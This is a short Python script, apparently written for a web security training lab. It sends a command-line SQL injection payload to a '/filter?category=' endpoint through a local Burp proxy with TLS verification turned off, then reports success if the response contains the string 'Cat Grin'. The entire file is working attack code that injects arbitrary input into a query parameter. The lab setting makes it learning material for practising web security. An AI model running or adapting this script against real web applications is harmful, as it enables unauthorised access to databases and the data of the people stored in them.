# Import necessary libraries
import requests  # For making HTTP requests
import sys  # For handling command-line arguments
import urllib3  # For disabling SSL/TLS warnings

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to exploit SQL injection vulnerability
def exploit_sqli(url, payload):
    # Construct the URI for the vulnerable endpoint
    uri = '/filter?category='
    
    # Send a GET request to the vulnerable URL with the provided payload
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    
    # Check if the response contains a specific string indicating successful exploitation
    if "Cat Grin" in r.text:
        return True  # Successful exploitation
    else:
        return False  # Unsuccessful exploitation

# Main program execution block
if __name__ == "__main__":
    try:
        # Get URL and payload from command-line arguments
        url = sys.argv[1].strip()  # URL of the vulnerable web application
        payload = sys.argv[2].strip()  # Payload for SQL injection
        
    except IndexError:
        # Print usage instructions and exit if arguments are missing
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    
    # Attempt SQL injection using the provided URL and payload
    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")